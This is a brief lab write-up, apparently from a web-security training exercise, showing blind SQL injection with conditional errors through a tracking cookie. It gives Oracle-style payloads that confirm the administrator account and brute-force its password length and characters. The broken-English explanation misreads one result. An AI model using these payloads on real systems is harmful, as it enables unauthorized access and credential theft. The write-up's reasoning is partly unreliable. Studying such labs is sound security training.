blind sql injection with conditional errors

use this quatation in tracker cookies

analysis

in (') this single quatation we have a error
in ('')this double quatation we dont have a error

so it is vulnerable


`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
in this query we got the 500 error

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='dsvdvcxb zv')||'`
after we use the some random username it will exists
this shows the adminisatrator in not database


now we find lenght of the password

`'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
lenght of the password is finded

`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 after brute forcing in this query we find the first letter is "L"
`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
after we try the brute force in password lenght to find the password 

we find the password and successfully finished the lab




 


